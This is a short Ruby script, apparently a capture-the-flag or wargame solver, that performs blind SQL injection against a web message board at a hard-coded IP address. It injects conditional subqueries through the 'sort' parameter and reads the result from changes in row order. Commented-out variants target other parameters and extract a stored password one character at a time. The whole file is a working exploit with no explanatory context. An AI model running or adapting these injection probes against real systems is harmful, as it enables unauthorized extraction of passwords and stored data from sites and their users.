#!/usr/bin/env ruby
STDOUT.sync = true

require 'open-uri'
#url = "http://114.201.226.101/d0602c9017f5ae953f740ba7e844911d/?no="
#url = "http://114.201.226.101/d0602c9017f5ae953f740ba7e844911d/?type=1&search="
#url = "http://114.201.226.101/d0602c9017f5ae953f740ba7e844911d/?no=1&password="
url = "http://114.201.226.101/d0602c9017f5ae953f740ba7e844911d/?sort="

#url += URI.encode("*if((select substr(password,1,1) from sboard where no=1)>char(127),1,-1)")
#url += URI.encode("*if((select count(no) from sboard),1,-1)")
url += URI.encode("*if((select length(content) from sboard where no=1)>10,1,-1)")

puts "[.] #{url}"
data = open(url).read
data = data.
  sub(/<head>.*<\/head>/m,'').
  sub(/<div id=foot_board>.*<\/div>/m,'').
  gsub("\t",'')

if data['Guest</td><td>2011-08-21</td></tr><tr><td>3</td><td>Vguard for smartphone']
  puts "[!] TRUE"
elsif data['Vman</td><td>2011-08-22</td></tr><tr><td>2</td><td>Welcome !']
  puts "[!] FALSE"
else
  puts data
end
